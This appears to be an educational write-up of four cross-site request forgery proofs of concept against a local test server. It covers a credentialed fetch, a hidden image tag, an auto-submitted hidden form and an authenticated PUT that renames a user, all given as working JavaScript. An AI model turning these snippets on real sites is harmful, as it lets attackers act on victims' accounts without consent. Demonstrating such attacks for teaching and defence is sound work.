# CSRF Attack Demonstration Proofs of Concept

## Overview
This document provides proof-of-concept (PoC) scripts for demonstrating Cross-Site Request Forgery (CSRF) attacks. These examples are for **educational purposes only** and should only be used in controlled environments.

---

## Attack 1: Fetch CSRF

### Description
This attack uses the `fetch()` API to make a cross-origin GET request with credentials included.

### PoC Code
```javascript
async function executeFetchCSRF() {
    try {
        const response = await fetch('http://localhost:3000/api/test', {
            method: 'GET',
            mode: 'cors',
            credentials: 'include',
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        });

        const data = await response.json();
        console.log('SUCCESS:', data);
    } catch (error) {
        console.error('FAILED:', error);
    }
}
```

---

## Attack 2: Image Tag CSRF

### Description
This attack creates a hidden `<img>` tag to trigger a GET request automatically.

### PoC Code
```javascript
function executeImageCSRF() {
    const csrfImg = document.createElement('img');
    csrfImg.style.display = 'none';
    csrfImg.src = `http://localhost:3000/api/test?timestamp=${Date.now()}`;

    csrfImg.onload = function() {
        console.log('SUCCESS: Request completed');
    };

    csrfImg.onerror = function() {
        console.log('Request sent (error expected for non-image)');
    };

    document.body.appendChild(csrfImg);
    setTimeout(() => {
        if (document.body.contains(csrfImg)) {
            document.body.removeChild(csrfImg);
        }
    }, 5000);
}
```

---

## Attack 3: Form Submission CSRF

### Description
This attack auto-submits a hidden form via an iframe to the target endpoint.

### PoC Code
```javascript
function executeFormCSRF() {
    const form = document.createElement('form');
    form.action = 'http://localhost:3000/api/test';
    form.method = 'GET';
    form.target = 'csrf-frame';
    form.style.display = 'none';

    const fields = [
        { name: 'method', value: 'form_submission' },
        { name: 'victim_id', value: 'user123' },
        { name: 'timestamp', value: Date.now().toString() }
    ];

    fields.forEach(field => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = field.name;
        input.value = field.value;
        form.appendChild(input);
    });

    document.body.appendChild(form);
    form.submit();
    setTimeout(() => {
        if (document.body.contains(form)) {
            document.body.removeChild(form);
        }
    }, 3000);
}
```

---

## Attack 4: Authenticated PUT Request CSRF

### Description
This attack sends an authenticated PUT request to change the username to "TREVOR".

### PoC Code
```javascript
async function executePutCSRF() {
    try {
        const response = await fetch('http://localhost:3000/api/auth/username-cookie', {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                username: 'TREVOR' 
            }),
            credentials: 'include'
        });

        const data = await response.json();
        if (response.ok) {
            console.log('SUCCESS: Username changed to "TREVOR"', data);
        } else {
            console.error('FAILED:', data.error || response.statusText);
        }
    } catch (error) {
        console.error('ERROR:', error);
    }
}
```

---

## Disclaimer
These PoCs are intended for **educational purposes only**. Do not use these scripts in unauthorized environments. Always obtain proper permissions before testing vulnerabilities.